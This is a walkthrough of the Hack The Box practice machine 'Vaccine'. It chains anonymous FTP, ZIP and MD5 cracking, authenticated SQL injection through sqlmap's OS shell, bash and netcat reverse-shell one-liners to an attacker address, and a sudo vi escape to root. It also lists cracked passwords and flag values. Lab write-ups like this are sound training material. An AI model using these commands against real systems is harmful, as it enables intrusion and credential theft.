+++
title = "HTB Starting Point — Vaccine"
date = "2026-03-06T00:00:00-05:00"
tags = ["htb", "starting-point", "linux", "ftp", "sql-injection", "postgresql", "hash-cracking", "privesc", "retired"]
description = "Full walkthrough of Hack The Box Vaccine — FTP anonymous login, zip cracking, MD5 hash cracking, authenticated SQLi with sqlmap, and sudo vi escape to root."
draft = false
+++

## Machine Info

| Field       | Value                              |
|-------------|------------------------------------|
| Name        | Vaccine                            |
| Platform    | Hack The Box — Starting Point      |
| Tier        | Tier 2                             |
| Difficulty  | Very Easy                          |
| OS          | Linux (Ubuntu 19.10)               |
| Release     | 2021                               |
| Tags        | FTP, Hash Cracking, SQL Injection, PostgreSQL, Sudo Exploitation |

Vaccine is the third box in the HTB Starting Point Tier 2 path. It builds on credentials found in earlier machines (Oopsie), and demonstrates a clean chain of: anonymous FTP access → ZIP and hash cracking → authenticated SQL injection → OS command execution → privilege escalation via a sudoers misconfiguration.

---

## 1. Initial Enumeration (nmap)

```
sudo nmap -sV -sC 10.129.x.x -oN vaccine.nmap
```

Full relevant output:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
|     FTP server status:
|       Connected to ::ffff:10.10.15.153
|       Logged in as ftpuser
|       TYPE: ASCII
|       No session bandwidth limit
|       Session timeout in seconds is 300
|       Control connection is plain text
|       Data connections will be plain text
|       At session startup, client count was 1
|       vsFTPd 3.0.3 - secure, fast, stable
|_    End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x 1 0 0 2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Three open ports:
- **21/tcp** — vsftpd 3.0.3, anonymous FTP login allowed, `backup.zip` present
- **22/tcp** — OpenSSH 8.0p1
- **80/tcp** — Apache 2.4.41, page title "MegaCorp Login"

---

## 2. FTP Enumeration

The nmap `-sC` flag already ran the ftp-anon script and confirmed anonymous login is allowed, with a single file `backup.zip` (2533 bytes, dated Apr 13 2021) in the root directory.

Connect and retrieve the file:

```
ftp 10.129.x.x
```

At the login prompt use `anonymous` as the username. Any string (or blank) works as the password.

```
Name (10.129.x.x:kali): anonymous
Password: <enter>
230 Login successful.
ftp> ls -la
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
ftp> get backup.zip
226 Transfer complete.
ftp> bye
```

Note: Some writeups show using the FTP credentials `ftpuser:mc@F1l3ZilL4` obtained from the previous Starting Point box (Oopsie). Either credential set reaches the same file.

---

## 3. Cracking the ZIP File

The archive is password-protected. Extract the hash and crack it with John the Ripper:

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

John output:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-xx-xx xx:xx) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Session completed.
```

**ZIP password: `741852963`**

Alternatively, `fcrackzip` works just as well:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

Output:
```
PASSWORD FOUND!!!!: pw == 741852963
```

Extract with either tool:
```bash
unzip backup.zip
# prompted for password: 741852963
```

Contents:
- `index.php`
- `style.css`

---

## 4. What's Inside the ZIP — PHP Source and MD5 Hash

`index.php` is the login page for the web application. The relevant authentication block:

```php
<?php
session_start();

if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
        $_SESSION['login'] = "true";
        header("Location: dashboard.php");
    }
}
?>
```

The username is hardcoded to `admin`. The password is compared as an MD5 hash.

**MD5 hash to crack: `2cb42f8734ea607eefed3b70af13bbd3`**

---

## 5. Cracking the MD5 Hash

Crack it with hashcat using mode `0` (raw MD5) against rockyou.txt:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > admin.hash
hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt
```

Result:
```
2cb42f8734ea607eefed3b70af13bbd3:qwerty789
```

**Admin password: `qwerty789`**

Alternatively, submit the hash to any online MD5 rainbow table (crackstation.net, hashes.com) — it resolves instantly since `qwerty789` is a common password.

Credentials obtained: **`admin:qwerty789`**

---

## 6. Web Enumeration — Port 80

Navigating to `http://10.129.x.x/` presents a "MegaCorp Login" page. Log in with `admin:qwerty789`.

This redirects to `/dashboard.php`, which is a Car Catalogue application. It contains a search field that issues a GET request:

```
GET /dashboard.php?search=<term>
```

Testing with a single quote (`'`) in the search field immediately returns an SQL error, confirming unsanitized input is being passed directly to a query.

---

## 7. SQL Injection — Discovery and Exploitation with sqlmap

The `search` parameter is injectable. To use sqlmap, a valid session cookie is required since the dashboard requires authentication.

Log in via the browser, then copy the `PHPSESSID` value from your browser's developer tools or a proxy like Burp Suite.

**Basic enumeration:**

```bash
sqlmap -u 'http://10.129.x.x/dashboard.php?search=a' \
  --cookie="PHPSESSID=<your_session_id>" \
  --batch \
  --dbs
```

sqlmap identifies the injection type and backend:

```
[INFO] GET parameter 'search' is 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] GET parameter 'search' appears to be 'PostgreSQL stacked queries (comment)' injectable
[INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
```

Available databases include `carsdb` and the system `information_schema`.

**Getting an OS shell directly:**

Because the backend is PostgreSQL, sqlmap can leverage stacked queries and PostgreSQL's `COPY ... FROM PROGRAM` to achieve OS-level command execution via the `--os-shell` flag:

```bash
sqlmap -u 'http://10.129.x.x/dashboard.php?search=a' \
  --cookie="PHPSESSID=<your_session_id>" \
  --os-shell \
  --batch
```

If you encounter the error `unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported`, flush the sqlmap session cache and retry:

```bash
sqlmap -u 'http://10.129.x.x/dashboard.php?search=a' \
  --cookie="PHPSESSID=<your_session_id>" \
  --os-shell \
  --batch \
  --flush-session
```

sqlmap drops a PHP web shell onto the server (typically under `/var/www/html/tmpXXXXXX.php` or a similarly named temp file) and provides an interactive prompt:

```
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
```

The shell runs as the `postgres` user.

---

## 8. Getting a Reverse Shell

From the sqlmap os-shell, set up a netcat listener on your attack box:

```bash
nc -lvnp 4444
```

Then in the os-shell, send a bash reverse shell:

```bash
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
```

Or the mkfifo variant, which is more reliable when bash redirection is blocked:

```bash
os-shell> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.x 4444 >/tmp/f
```

You receive a shell as `postgres`. Stabilise it immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then background with CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

You now have a stable interactive shell as `postgres`.

---

## 9. User Flag

The user flag is in the postgres home directory:

```
postgres@vaccine:/var/lib/postgresql$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

Path: `/var/lib/postgresql/user.txt`

---

## 10. Privilege Escalation

### Finding the postgres password in dashboard.php

Before escalating, read `/var/www/html/dashboard.php` to find the database connection string:

```bash
cat /var/www/html/dashboard.php
```

Relevant line:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

**Postgres OS user password: `P@s5w0rd!`**

This lets you SSH in directly for a more stable shell:

```bash
ssh postgres@10.129.x.x
# password: P@s5w0rd!
```

### sudo -l

```bash
postgres@vaccine:~$ sudo -l
```

Output:

```
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The `postgres` user can run `/bin/vi` (as root, with `NOPASSWD`) on a specific file. This is the classic editor sudo escape.

### Exploiting vi to get root

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi, escape to a root shell using one of these methods:

**Method 1 — direct shell escape:**
```
:!/bin/bash
```

**Method 2 — set shell variable and invoke it:**
```
:set shell=/bin/sh
:shell
```

Either drops you into a root shell:

```
root@vaccine:/etc/postgresql/11/main# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
root@vaccine:~# cat /root/root.txt
dd6e058e814260bc70e9bbdef2715849
```

---

## Summary of Flags

| Flag      | Path                              | Value                              |
|-----------|-----------------------------------|------------------------------------|
| user.txt  | `/var/lib/postgresql/user.txt`    | `ec9b13ca4d6229cd5cc1e09980965bf7` |
| root.txt  | `/root/root.txt`                  | `dd6e058e814260bc70e9bbdef2715849` |

---

## Full Attack Chain

```
nmap scan
  -> port 21: anonymous FTP -> backup.zip
      -> zip2john + john -> password: 741852963
          -> unzip -> index.php (MD5 hash: 2cb42f8734ea607eefed3b70af13bbd3)
              -> hashcat -m 0 -> qwerty789
                  -> login: admin:qwerty789 at port 80
                      -> /dashboard.php?search= is SQLi vulnerable
                          -> sqlmap --os-shell -> RCE as postgres
                              -> bash reverse shell -> user.txt
                                  -> cat /var/www/html/dashboard.php -> P@s5w0rd!
                                      -> ssh postgres@target
                                          -> sudo -l -> /bin/vi on pg_hba.conf
                                              -> :!/bin/bash -> root shell -> root.txt
```

---

## Key Takeaways

- Anonymous FTP is a dangerous default; never expose a server to it without tight firewall controls.
- Backing up web application source to an FTP-accessible directory leaks credentials and business logic.
- Storing passwords as unsalted MD5 offers no real protection — the hash cracks in milliseconds against any wordlist.
- Authenticated SQL injection is still a critical vulnerability even when login requires a password.
- PostgreSQL's `COPY FROM PROGRAM` makes `--os-shell` in sqlmap particularly effective compared to MySQL.
- Overly permissive sudoers entries — especially for editors — are a well-known privilege escalation vector documented extensively on [GTFOBins](https://gtfobins.github.io/gtfobins/vi/).

---

## References

- [htb-vaccine — PuckieStyle](https://www.puckiestyle.nl/htb-vaccine/)
- [Vaccine Walkthrough — Shapman GitBook](https://shapmanasick.gitbook.io/starting-point-htb/vaccine-walkthrough)
- [HTB Vaccine Walkthrough — Gavin's Blog](https://gavincrz.github.io/2021/08/10/HTB-Vaccine-Walkthrough/)
- [Vaccine — Tier II — HTB Walkthrough — Reginald Oparah](https://medium.com/@oparahreginaldcx7/vaccine-tier-ii-htb-walkthrough-2d77365c9f1b)
- [HTB Walkthrough — Vaccine — tonyharkness.com](https://tonyharkness.com/posts/htb-vaccine/)
- [Vaccine — WeTOFU](https://wetofu.github.io/ctf/writeup/htb/htb-vaccine/)
- [Vaccine (HTB Starting Point) — Gabriel Santos](https://medium.com/@gabrielreissantos/vaccine-htb-starting-point-from-anonymous-ftp-to-root-dd18096abe7d)
- [HackTheBox Starting Point: Vaccine — CyberEthical](https://blog.cyberethical.me/htb-starting-point-vaccine)
- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
